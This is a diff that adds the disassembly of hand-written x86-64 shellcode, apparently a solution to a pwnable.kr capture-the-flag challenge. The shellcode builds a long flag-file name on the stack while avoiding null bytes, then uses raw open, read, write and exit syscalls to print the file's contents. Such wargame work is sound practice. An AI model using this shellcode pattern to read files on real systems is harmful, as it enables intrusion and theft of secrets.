@@ -1,0 +1,114 @@
+0000000000401140 <main>:
+  401140:	48 89 e5             	mov    %rsp,%rbp
+  401143:	48 bb 74 68 69 73 5f 	movabs $0x5f73695f73696874,%rbx
+  40114a:	69 73 5f 
+  40114d:	48 b9 05 38 fa 42 f0 	movabs $0x5f0bfaf042fa3805,%rcx
+  401154:	fa 0b 5f 
+  401157:	48 29 cb             	sub    %rcx,%rbx
+  40115a:	53                   	push   %rbx
+  40115b:	48 bb 6f 30 6f 30 6f 	movabs $0x306f306f306f306f,%rbx
+  401162:	30 6f 30 
+  401165:	53                   	push   %rbx
+  401166:	48 bb 30 30 30 30 30 	movabs $0x3030303030303030,%rbx
+  40116d:	30 30 30 
+  401170:	53                   	push   %rbx
+  401171:	48 bb 6f 6f 6f 6f 30 	movabs $0x303030306f6f6f6f,%rbx
+  401178:	30 30 30 
+  40117b:	53                   	push   %rbx
+  40117c:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  401183:	6f 6f 6f 
+  401186:	53                   	push   %rbx
+  401187:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  40118e:	6f 6f 6f 
+  401191:	53                   	push   %rbx
+  401192:	48 bb 30 30 30 30 30 	movabs $0x6f6f6f3030303030,%rbx
+  401199:	6f 6f 6f 
+  40119c:	53                   	push   %rbx
+  40119d:	48 bb 30 30 30 30 30 	movabs $0x3030303030303030,%rbx
+  4011a4:	30 30 30 
+  4011a7:	53                   	push   %rbx
+  4011a8:	48 bb 30 30 30 30 30 	movabs $0x3030303030303030,%rbx
+  4011af:	30 30 30 
+  4011b2:	53                   	push   %rbx
+  4011b3:	48 bb 6f 6f 6f 6f 30 	movabs $0x303030306f6f6f6f,%rbx
+  4011ba:	30 30 30 
+  4011bd:	53                   	push   %rbx
+  4011be:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  4011c5:	6f 6f 6f 
+  4011c8:	53                   	push   %rbx
+  4011c9:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  4011d0:	6f 6f 6f 
+  4011d3:	53                   	push   %rbx
+  4011d4:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  4011db:	6f 6f 6f 
+  4011de:	53                   	push   %rbx
+  4011df:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  4011e6:	6f 6f 6f 
+  4011e9:	53                   	push   %rbx
+  4011ea:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  4011f1:	6f 6f 6f 
+  4011f4:	53                   	push   %rbx
+  4011f5:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  4011fc:	6f 6f 6f 
+  4011ff:	53                   	push   %rbx
+  401200:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  401207:	6f 6f 6f 
+  40120a:	53                   	push   %rbx
+  40120b:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  401212:	6f 6f 6f 
+  401215:	53                   	push   %rbx
+  401216:	48 bb 6f 6f 6f 6f 6f 	movabs $0x6f6f6f6f6f6f6f6f,%rbx
+  40121d:	6f 6f 6f 
+  401220:	53                   	push   %rbx
+  401221:	48 bb 73 5f 76 65 72 	movabs $0x6c5f797265765f73,%rbx
+  401228:	79 5f 6c 
+  40122b:	53                   	push   %rbx
+  40122c:	48 bb 65 5f 6e 61 6d 	movabs $0x695f656d616e5f65,%rbx
+  401233:	65 5f 69 
+  401236:	53                   	push   %rbx
+  401237:	48 bb 5f 74 68 65 5f 	movabs $0x6c69665f6568745f,%rbx
+  40123e:	66 69 6c 
+  401241:	53                   	push   %rbx
+  401242:	48 bb 6c 65 2e 73 6f 	movabs $0x7972726f732e656c,%rbx
+  401249:	72 72 79 
+  40124c:	53                   	push   %rbx
+  40124d:	48 bb 5f 74 68 69 73 	movabs $0x69665f736968745f,%rbx
+  401254:	5f 66 69 
+  401257:	53                   	push   %rbx
+  401258:	48 bb 61 73 65 5f 72 	movabs $0x646165725f657361,%rbx
+  40125f:	65 61 64 
+  401262:	53                   	push   %rbx
+  401263:	48 bb 66 69 6c 65 5f 	movabs $0x656c705f656c6966,%rbx
+  40126a:	70 6c 65 
+  40126d:	53                   	push   %rbx
+  40126e:	48 bb 6b 72 5f 66 6c 	movabs $0x5f67616c665f726b,%rbx
+  401275:	61 67 5f 
+  401278:	53                   	push   %rbx
+  401279:	48 bb 70 77 6e 61 62 	movabs $0x2e656c62616e7770,%rbx
+  401280:	6c 65 2e 
+  401283:	53                   	push   %rbx
+  401284:	48 bb 74 68 69 73 5f 	movabs $0x5f73695f73696874,%rbx
+  40128b:	69 73 5f 
+  40128e:	53                   	push   %rbx
+  40128f:	48 89 e7             	mov    %rsp,%rdi
+  401292:	48 31 f6             	xor    %rsi,%rsi
+  401295:	48 31 d2             	xor    %rdx,%rdx
+  401298:	48 31 c0             	xor    %rax,%rax
+  40129b:	b0 02                	mov    $0x2,%al
+  40129d:	0f 05                	syscall 
+  40129f:	48 31 db             	xor    %rbx,%rbx
+  4012a2:	88 c3                	mov    %al,%bl
+  4012a4:	48 31 ff             	xor    %rdi,%rdi
+  4012a7:	40 88 df             	mov    %bl,%dil
+  4012aa:	48 89 e6             	mov    %rsp,%rsi
+  4012ad:	48 31 d2             	xor    %rdx,%rdx
+  4012b0:	b2 40                	mov    $0x40,%dl
+  4012b2:	48 31 c0             	xor    %rax,%rax
+  4012b5:	0f 05                	syscall 
+  4012b7:	40 b7 01             	mov    $0x1,%dil
+  4012ba:	b0 01                	mov    $0x1,%al
+  4012bc:	0f 05                	syscall 
+  4012be:	48 31 c0             	xor    %rax,%rax
+  4012c1:	b0 3c                	mov    $0x3c,%al
+  4012c3:	48 31 ff             	xor    %rdi,%rdi
+  4012c6:	0f 05                	syscall
